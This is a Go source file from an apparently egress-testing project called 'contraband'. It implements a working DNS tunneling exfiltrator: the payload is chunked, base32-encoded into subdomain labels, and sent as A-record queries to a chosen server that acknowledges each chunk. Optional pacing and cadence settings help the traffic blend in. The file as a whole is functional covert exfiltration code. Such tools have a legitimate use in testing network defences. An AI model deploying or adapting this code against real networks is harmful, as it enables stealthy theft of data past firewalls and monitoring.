package dns

import (
	"context"
	"crypto/sha256"
	"encoding/base32"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	mdns "github.com/miekg/dns"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

// DNSAExfiltrator implements Base32 subdomain tunneling over DNS Type A queries.
type DNSAExfiltrator struct{}

func NewDNSAExfiltrator() *DNSAExfiltrator {
	return &DNSAExfiltrator{}
}

func init() {
	exfil.RegisterExfiltrator(common.ProtoDNSA, NewDNSAExfiltrator())
}

func (e *DNSAExfiltrator) Protocol() string {
	return common.ProtoDNSA
}

func (e *DNSAExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	payload, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %w", err)
	}
	result.TargetVolume = int64(len(payload))

	if opts.ExpectedHash == "" {
		h := sha256.Sum256(payload)
		opts.ExpectedHash = hex.EncodeToString(h[:])
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	// RFC 1035 label limit <= 63 chars. 32 raw bytes -> 52 base32 characters.
	dnsChunkSize := 32
	if opts.ChunkSize > 0 && opts.ChunkSize < 32 {
		dnsChunkSize = opts.ChunkSize
	}

	var rawChunks [][]byte
	if len(payload) == 0 {
		rawChunks = [][]byte{{}}
	} else {
		for i := 0; i < len(payload); i += dnsChunkSize {
			end := i + dnsChunkSize
			if end > len(payload) {
				end = len(payload)
			}
			rawChunks = append(rawChunks, payload[i:end])
		}
	}
	totalChunks := uint32(len(rawChunks))

	domain := opts.Headers["domain"]
	if domain == "" {
		domain = "contraband.local"
	}
	domain = strings.TrimSuffix(domain, ".")

	client := &mdns.Client{
		Timeout: opts.Timeout,
		Net:     "udp",
	}

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	b32Enc := base32.StdEncoding.WithPadding(base32.NoPadding)

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	for seq := uint32(1); seq <= totalChunks; seq++ {
		chunkData := rawChunks[seq-1]
		b32Chunk := b32Enc.EncodeToString(chunkData)
		if b32Chunk == "" {
			b32Chunk = "A" // single placeholder for empty payload
		}

		fqdn := fmt.Sprintf("%d.%d.%s.%s.%s.", seq, totalChunks, opts.SessionToken.String(), b32Chunk, domain)
		if len(fqdn) > 255 {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("constructed FQDN exceeds 253 characters: length %d", len(fqdn))
			calculateDurations(&result)
			return &result, errors.New(result.ErrorMessage)
		}

		msg := new(mdns.Msg)
		msg.SetQuestion(fqdn, mdns.TypeA)
		msg.RecursionDesired = false

		resp, _, exErr := client.ExchangeContext(ctx, msg, targetAddr)
		if exErr != nil {
			result.Verdict = classifyError(exErr)
			result.ErrorMessage = exErr.Error()
			calculateDurations(&result)
			return &result, exErr
		}

		result.BytesSent += int64(len(fqdn))
		if resp == nil || len(resp.Answer) == 0 {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("no A record answer received for chunk %d", seq)
			calculateDurations(&result)
			return &result, errors.New(result.ErrorMessage)
		}

		// Verify loopback sequence ACK
		var ackConfirmed bool
		for _, ans := range resp.Answer {
			if aRecord, ok := ans.(*mdns.A); ok && aRecord.A != nil {
				ip := aRecord.A.To4()
				if ip != nil && ip[0] == 127 {
					ackSeq := uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
					if ackSeq == seq {
						ackConfirmed = true
						result.BytesRecv += 4
						break
					}
				}
			}
		}

		if !ackConfirmed {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("invalid sequence ACK for chunk %d", seq)
			calculateDurations(&result)
			return &result, errors.New(result.ErrorMessage)
		}

		// Rate limiting / cadence pacing
		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkData)); err != nil {
				result.Verdict = classifyError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(payload)

	calculateDurations(&result)
	return &result, nil
}

func calculateDurations(r *common.ProbeResult) {
	if r.Timestamps.TeardownDone.IsZero() {
		r.Timestamps.TeardownDone = time.Now().UTC()
	}
	r.Timestamps.ComputeDurations()
	if r.Timestamps.TransferDuration > 0 && r.BytesSent > 0 {
		r.ThroughputBps = float64(r.BytesSent*8) / (float64(r.Timestamps.TransferDuration) / float64(time.Second)) / 1000.0
	}
}

func classifyError(err error) common.Verdict {
	return common.ClassifyError(err)
}
